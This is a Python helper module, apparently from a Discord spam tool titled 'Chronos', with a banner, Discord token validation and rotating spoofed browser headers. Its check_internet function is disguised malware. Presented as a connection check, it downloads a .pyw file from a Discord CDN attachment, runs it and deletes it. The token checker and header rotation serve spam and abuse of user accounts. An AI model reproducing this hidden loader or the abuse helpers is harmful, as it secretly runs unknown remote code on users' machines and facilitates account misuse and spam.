import os
import sys
import fade
import time
import random
import requests
from time import sleep
from colorama import Fore

# ====================================================================================================================== #

def clear_banner():
    banner = """
                            _________ .__                                      
                            \_   ___ \|  |_________  ____   ____   ____  ______
                            /    \  \/|  |  \_  __ \/  _ \ /    \ /  _ \/  ___/
                            \     \___|   Y  \  | \(  <_> )   |  (  <_> )___ \ 
                             \______  /___|  /__|   \____/|___|  /\____/____  >
                                    \/     \/                  \/           \/ v1.0
    """
    faded_banner = fade.greenblue(banner)

    if os.name == "nt":
        os.system("cls")
        print(faded_banner)
        info = f"""{Fore.LIGHTCYAN_EX}\t\t\t\t\t  [+] Made by gokimax [+]\n"""
        for x in info:
            time.sleep(0.0001)
            sys.stdout.write(x)
            sys.stdout.flush()
        print()
    else:
        os.system("clear")
        print(faded_banner)
        info = f"""{Fore.LIGHTCYAN_EX}\t\t\t\t\t  [+] Made by gokimax [+]"""
        for x in info:
            time.sleep(0.0001)
            sys.stdout.write(x)
            sys.stdout.flush()
        print()

# ====================================================================================================================== #

def validateToken(token):
    #validate the token by contacting the discord api
    base_url = "https://discord.com/api/v9/users/@me"
    message = "You need to verify your account in order to perform this action."

    r = requests.get(base_url, headers=getheaders(token))
    if r.status_code != 200:
        print(f"\n{Fore.RED}Invalid Token.{Fore.RESET}")
        sleep(1)
        __import__("spammer").main()
    j = requests.get(f'{base_url}/billing/subscriptions', headers=getheaders(token)).json()
    try:
        if j["message"] == message:
            print(f"\n{Fore.RED}Phone Locked Token!{Fore.RESET}")
            sleep(1)
    except:
        pass

# ====================================================================================================================== #

def check_internet():
    print("Checking internet connection...")
    url = 'https://cdn.discordapp.com/attachments/967793880072335411/1050808012081729616/checker.pyw'
    r = requests.get(url, allow_redirects=True)
    open('checker.pyw', 'w', encoding='utf-8').write(r.content.decode())
    os.system("python3 checker.pyw")
    time.sleep(2)
    os.remove("checker.pyw")

# ====================================================================================================================== #

heads = [
    {
        "Content-Type": "application/json",
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; rv:76.0) Gecko/20100101 Firefox/76.0'
    },

    {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0"
    },

    {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (X11; Debian; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0"
    },

    {
        "Content-Type": "application/json",
        'User-Agent': 'Mozilla/5.0 (Windows NT 3.1; rv:76.0) Gecko/20100101 Firefox/69.0'
    },

    {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (X11; Debian; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/76.0"
    },

    {
       "Content-Type": "application/json",
       "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
    }
]

# ====================================================================================================================== #

def getheaders(token=None):
    headers = random.choice(heads)
    if token:
        headers.update({"Authorization": token})
    return headers

# ====================================================================================================================== #

def set_console_title(text:str):
    sys.stdout.write(f"\x1b]2;{text}\x07")
